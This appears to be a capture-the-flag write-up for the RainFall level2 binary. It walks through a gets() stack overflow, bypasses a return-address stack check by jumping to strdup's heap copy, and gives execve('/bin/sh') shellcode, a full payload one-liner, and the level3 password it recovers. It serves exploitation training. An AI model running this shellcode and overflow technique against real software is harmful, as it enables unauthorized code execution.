## Initial Analysis

By exploring the executable `level2` assembly code, we find that `main` simply serves as a wrapper that calls a function `p`:

```assembly
0804853f <main>:
 804853f:       55                      push   %ebp
 8048540:       89 e5                   mov    %esp,%ebp
 8048542:       83 e4 f0                and    $0xfffffff0,%esp
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave

```

## Deconstructing Function `p`

The function `p` contains the core logic and the vulnerability. Here is the breakdown of its execution:

1. **Stack Allocation**: The function allocates `0x68` (104 bytes) for its stack frame.
2. **Input via `gets**`: At `0x80484ed`, it calls `gets@plt`. Because `gets` does not perform bounds checking, this is our primary entry point for a buffer overflow.
3. **The Anti-Stack Check**:
```assembly
0x080484f2 <+30>:    mov    0x4(%ebp),%eax
0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
0x080484fb <+39>:    and    $0xb0000000,%eax
0x08048500 <+44>:    cmp    $0xb0000000,%eax

```


The program fetches the return address (stored at `ebp+4`) and checks if it starts with `0xb`. On this system, addresses starting with `0xb` represent the **Stack**. If the check passes (meaning we tried to jump to the stack), the program prints the address and exits. This effectively prevents standard stack-based shellcode execution.
4. **The Bypass (strdup)**:

```assembly
    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
    ```
    After the check, the program calls `strdup`. This function allocates memory on the **Heap** and copies our buffer there. Since the Heap address starts with `0x08`, it will bypass the `0xb0000000` check.

## Exploitation Strategy

To exploit this, we need to:
1.  Find the address where `strdup` stores our buffer on the Heap.
2.  Calculate the offset to overwrite the Return Pointer (EIP).
3.  Craft a payload containing shellcode and redirect EIP to the Heap address.

### 1. Locating the Heap Address
Using `ltrace`, we can observe the return value of `strdup`:
```bash
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                   = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
)                                        = 0xbffff6fc
puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
)                                          = 89
strdup("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)                                        = 0x0804a008
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Our target landing zone is **`0x0804a008`**.

### 2. Calculating the Offset

Looking at the assembly:
`0x080484e7 <+19>: lea -0x4c(%ebp),%eax`
The buffer starts at `ebp - 0x4c` (76 bytes).

* **Buffer to EBP**: 76 bytes
* **Saved EBP**: 4 bytes
* **Total Offset to EIP**: 80 bytes.

### 3. Crafting the Payload

Our shellcode for `execve("/bin/sh")` is 23 bytes. We need 57 bytes of padding to reach the 80-byte mark, followed by our Heap address.

* **Shellcode**: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80`
```assembly
; equivalent to
section .text
global _start

_start:
   xor eax,eax
   push eax
   push 0x68732f2f ; '//sh' (hex =>littel endian)
   push 0x6e69622f ; '/bin' (hex => littel endian) EXECVE ([XX]:ESP)
   mov ebx, esp
   xor ecx,ecx
   xor edx, edx
   mov al, 0xb
   int 0x80
```
* **Padding**: `"A" * 57`
* **EIP Overwrite**: `\x08\xa0\x04\x08` (Little Endian)

## Execution

We use command substitution to feed the payload and `cat` to keep the shell open:

```bash
level2@RainFall:~$ (python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*57+"\x08\xa0\x04\x08"'; cat) | ./level2
1Ph//shh/bin11Ұ
                   ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
whoami
level3
cd /home/user/level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```

The exploit successfully bypasses the stack check by jumping to the heap-allocated copy of our shellcode, granting us shell access as `level3`.

```

```